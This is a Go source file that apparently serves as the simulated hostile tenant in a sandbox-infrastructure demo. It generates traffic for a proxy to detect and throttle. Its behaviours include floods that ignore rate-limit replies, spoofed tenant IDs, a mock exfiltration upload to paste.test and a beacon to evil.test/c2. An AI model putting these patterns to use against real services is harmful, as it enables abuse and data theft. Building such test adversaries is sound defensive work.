// Package sandbox simulates untrusted tenant code. It is the adversary in
// the demo: nothing in here is trusted by any other package.
package sandbox

import (
	"bytes"
	"context"
	"encoding/json"
	"io"
	"log/slog"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"

	"github.com/joachimzetterman/tiny-sandbox-infra/internal/clock"
	"github.com/joachimzetterman/tiny-sandbox-infra/internal/event"
)

type Config struct {
	Behaviour   string        // see scenario.Behaviours
	Start       time.Duration // normal until this offset, then Behaviour
	Rate        int           // events per second once Behaviour starts, 0 for the default
	EventsURL   string        // the proxy's event gateway
	EgressProxy string        // the proxy's egress port
	Clock       clock.Clock
}

const (
	tick       = 100 * time.Millisecond
	normalRate = 20   // events per second
	floodRate  = 2000 // default for flood
	burstEvery = 200  // ticks: a bursty sandbox spikes every 20 s
	burstLen   = 20   // ticks: for 2 s
	exfilChunk = 512 << 10
)

type sandbox struct {
	cfg     Config
	events  *http.Client
	egress  *http.Client
	owed    float64   // events not yet sent, carries fractions between ticks
	backoff time.Time // well-behaved code sends nothing until then
	failing bool      // last send failed, used to log once per outage
}

// Run sends traffic until ctx is cancelled.
func Run(ctx context.Context, cfg Config) error {
	proxyURL, err := url.Parse(cfg.EgressProxy)
	if err != nil {
		return err
	}
	s := &sandbox{
		cfg:    cfg,
		events: &http.Client{Timeout: 2 * time.Second},
		// Every outbound call goes through the egress proxy. There is no
		// other route anyway, see the network layout in launch.
		egress: &http.Client{Timeout: 5 * time.Second, Transport: &http.Transport{Proxy: http.ProxyURL(proxyURL)}},
	}
	started := cfg.Clock.Now()
	ticker := time.NewTicker(tick)
	defer ticker.Stop()
	for n := 0; ; n++ {
		select {
		case <-ctx.Done():
			return nil
		case <-ticker.C:
		}
		behaviour := "normal"
		if cfg.Clock.Now().Sub(started) >= cfg.Start {
			behaviour = cfg.Behaviour
		}
		s.step(ctx, n, behaviour)
	}
}

// step is one tick of one behaviour.
func (s *sandbox) step(ctx context.Context, n int, behaviour string) {
	rate, polite, kind := float64(normalRate), true, "log"
	switch behaviour {
	case "bursty": // a legitimate spike: eight times the rate for two seconds, inside the static limits
		if n%burstEvery < burstLen {
			rate *= 8
		}
	case "flood": // ignores every 429
		rate, polite = float64(s.cfg.Rate), false
		if s.cfg.Rate == 0 {
			rate = floodRate
		}
	case "exfil": // a large upload to a watched site, twice a second
		if n%5 == 0 {
			s.call(ctx, http.MethodPost, "http://paste.test/upload", exfilChunk)
		}
	case "baddest": // calls a known bad site, twice a second
		if n%5 == 0 {
			s.call(ctx, http.MethodGet, "http://evil.test/c2", 0)
		}
	case "rejectstorm": // events the schema does not know
		kind = "not-a-type"
	}
	if n%20 == 0 { // everyone fetches something trusted every two seconds
		s.call(ctx, http.MethodGet, "http://allowed.test/", 0)
	}
	now := s.cfg.Clock.Now()
	if polite && now.Before(s.backoff) {
		return
	}
	s.owed += rate * tick.Seconds()
	count := int(s.owed)
	s.owed -= float64(count)
	if count == 0 {
		return
	}
	if retry := s.send(ctx, count, kind, now); retry > 0 && polite {
		s.backoff = now.Add(retry) // a good citizen waits as long as it was told to
	}
}

var payload = strings.Repeat("x", 120)

// send posts count events and returns the Retry-After of a 429, or zero.
func (s *sandbox) send(ctx context.Context, count int, kind string, now time.Time) time.Duration {
	batch := event.Batch{Events: make([]event.Event, count)}
	for i := range batch.Events {
		// The tenant_id is a lie on purpose: the proxy must overwrite it.
		batch.Events[i] = event.Event{TenantID: "someone-else", Type: kind, EventTime: now, Payload: payload}
	}
	body, _ := json.Marshal(batch)
	req, _ := http.NewRequestWithContext(ctx, http.MethodPost, s.cfg.EventsURL, bytes.NewReader(body))
	resp, err := s.events.Do(req)
	if err != nil {
		if !s.failing {
			slog.Warn("cannot reach proxy", "err", err)
		}
		s.failing = true
		return 0
	}
	defer resp.Body.Close()
	_, _ = io.Copy(io.Discard, io.LimitReader(resp.Body, 1<<20))
	s.failing = false
	if resp.StatusCode == http.StatusTooManyRequests {
		seconds, _ := strconv.Atoi(resp.Header.Get("Retry-After"))
		return time.Duration(max(seconds, 1)) * time.Second
	}
	return 0
}

// call makes one outbound request through the egress proxy.
func (s *sandbox) call(ctx context.Context, method, target string, bodyBytes int) {
	req, _ := http.NewRequestWithContext(ctx, method, target, bytes.NewReader(make([]byte, bodyBytes)))
	resp, err := s.egress.Do(req)
	if err != nil {
		slog.Debug("egress call failed", "target", target, "err", err)
		return
	}
	defer resp.Body.Close()
	_, _ = io.Copy(io.Discard, io.LimitReader(resp.Body, 1<<20))
}
